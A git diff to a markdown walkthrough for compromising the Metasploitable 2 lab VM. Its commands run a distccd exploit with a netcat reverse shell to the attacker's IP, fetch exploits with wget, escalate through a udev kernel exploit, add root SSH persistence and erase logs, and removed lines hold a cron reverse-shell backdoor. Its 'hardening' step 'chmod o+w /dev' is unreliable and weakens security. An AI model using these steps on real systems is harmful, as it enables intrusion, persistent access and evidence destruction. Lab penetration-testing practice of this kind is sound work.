@@ -8,7 +8,7 @@ This document shows an hacking approach for Metasploitable 2, involving multiple
 
 Use `nmap` to identify open ports, services, and OS details.
 
-```
+```bash
 nmap -A -sV <target IP>
 ```
 
@@ -63,24 +63,26 @@ Normally you can search through the hacking db or similar like
 
 ## 3. Exploitation (Manual and Customized)
 
-### vsftpd 2.3.4 Backdoor:
+### distccd CVE-2004-2687 Backdoor Exploit:
 
 As a listener we use NetCat
 
+```bash
 nc -vnlp 4444
+```
 
 As the listener is active we execute the exploit and open the reverse shell.
 
 Now we got 2 ways to exploit the Vulnerability, either with a python exploit or with a metasploit exploit.
 Both exploits are downloadable in the exploits folder in this repository
 
-```
+```bash
 python2 distccd.py -t 192.168.56.101 -c "nc 192.168.56.1 4444 -e /bin/sh"
 ```
 
 now where we opened the listener we can send shell commands. with this command we change the shell to a bash shell
 
-```
+```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
@@ -90,7 +92,7 @@ Once a low-privilege shell is obtained, we escalate privileges.
 
 we do that with a kernel exploit. so we first check the release and kernel version with
 
-```
+```bash
 uname -a
 lsb_release -a
 ```
@@ -99,35 +101,120 @@ Here we see that the target has kernel 2.6.24 and is running Ubuntu 8.04
 
 With the metasploit framework we can search through exploits and filter to our requirement.
 
-```
+```bash
 searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
 ```
 
-this
-and
-this
-and
-this
+But for now we use the attached exploit in this repo in exploits direcory.
 
-### SSH Pivoting Example:
+With a python http server we share the 2 exploits and download them from the server
 
+```bash
+python3 -m http.server 8888
 ```
 
-ssh -L <local_port>:<target_IP>:<target_service_port> <user>@<compromised_host>
+and on the metasploitable we use
 
+```bash
+wget http://{Kali IP address}:8888/exploitname
 ```
 
-## 6. Post-Exploitation
+Command to check udevd process:
 
-### Dump Passwords:
+```bash
+ps aux | grep udev
+```
 
-Use tools like `hashdump` or `mimikatz` to retrieve stored passwords or hashes.
+```bash
+root      503  0.0  0.0 {30084}  7536 ? Ss   07:54 0:00 /usr/lib/systemd/systemd-udevd
+dominik 17354  0.0  0.0  6932 2160 pts/4 S+ 11:16 0:00 grep udev
+```
 
-### Gather Sensitive Data:
+What we are searching now is this PID in Braces. there should be in the output of the next command a PID which is 1 smaller than this one.
 
-Retrieve SSH keys, database files, and system credentials.
+```bash
+cat /proc/net/netlink
+```
 
-## 7. Covering Tracks
+And the output will look something like this
+
+| sk               | Eth | Pid   | Groups   | Rmem | Wmem | Dump | Locks | Drops | Inode |
+| ---------------- | --- | ----- | -------- | ---- | ---- | ---- | ----- | ----- | ----- |
+| 00000000f5f1e2d9 | 0   | 30083 | 00000113 | 0    | 0    | 0    | 2     | 0     | 73184 |
+| 00000000057eaf68 | 0   | 0     | 00000000 | 0    | 0    | 0    | 2     | 0     | 13    |
+| 000000002073828a | 0   | 0     | 00000440 | 0    | 0    | 0    | 2     | 0     | 21150 |
+
+So we got the PID which whould be 30083 one smaller than the PID from ps -aux | grep udev
+
+### Compiling and Executing the .c Exploit
+
+After identifying the correct PID for privilege escalation, the next step is to compile and execute a `.c` exploit on the target system. This exploit file, available in the `exploits` directory, needs to be transferred to the Metasploitable 2 instance (target system). First, make sure that you have a listener set up on your Kali Linux machine (for example, with Netcat on port 4444), which will catch the reverse shell initiated by the exploit.
+
+Steps to compile and execute the `.c` exploit:
+
+```bash
+# 1. Compile the exploit
+gcc -o exploit privilege_escalation.c
+
+# 2. Rename the reverse_shell.sh to run
+mv nc_rev.sh run
+
+# 2. Execute the compiled exploit
+./exploit {PID != 0}
+```
+
+With the listener active on your Kali machine, the exploit should connect back to it, granting you shell access with escalated privileges.
+
+### SSH Access:
+
+After successfully escalating privileges to root, you can set up persistent SSH access to the system:
+
+```bash
+# 1. Change the root password
+passwd
+```
+
+Follow the prompt to enter and confirm the new password.
+
+```bash
+# 2. Add your SSH public key
+# First, on your Kali machine, generate an SSH key pair if you haven’t already:
+ssh-keygen -t rsa -b 4096
+```
+
+Copy the content of the generated public key (~/.ssh/id_rsa.pub) and paste it into the root/.ssh/authorized_keys file on the Metasploitable machine:
+
+```bash
+echo "<your-public-key>" >> /root/.ssh/authorized_keys
+```
+
+## 6. Post-Exploitation - Good Path
+
+After obtaining root access, securing the target system is critical to prevent others from exploiting the same vulnerabilities.
+
+### Secure the system:
+
+```bash
+# 1. Remove DistCCD from the server
+update-rc.d -f distccd remove
+
+# 2. Configure the Firewall for distccd
+iptables -A INPUT -p tcp --dport 3632 -j DROP
+
+# 3. Set proper permissions for sensitive directories
+
+# Restrict access to /sbin to root only
+chmod 700 /sbin
+
+# Allow write access to /dev for others (use cautiously)
+chmod o+w /dev
+
+# 3. Install Network Intrusion Detection System (NIDS)
+# Install Snort to monitor network traffic for suspicious activity
+sudo apt install snort -y
+```
+
+## 7. Covering Tracks - Bad Path
 
 Securely delete sensitive files and logs to remove traces of the attack.
 
@@ -137,23 +224,3 @@ Securely delete sensitive files and logs to remove traces of the attack.
 - `.bash_history`
 
 Use `shred` or `dd` to securely delete files.
-
-## 8. Persistence
-
-To maintain access, plant a backdoor or create a new account.
-
-### Add a Cron Job for Backdoor:
-
-```
-
-echo "_/5 _ \* \* \* /bin/bash -i >& /dev/tcp/<attacker IP>/4444 0>&1" >> /etc/crontab
-
-```
-
-## Conclusion
-
-This methodology goes beyond simple Metasploit usage by manually exploiting vulnerabilities, escalating privileges, pivoting through networks, and ensuring persistence and stealth. Follow these steps to simulate a more complex attack on Metasploitable 2.
-
-```
-
-```
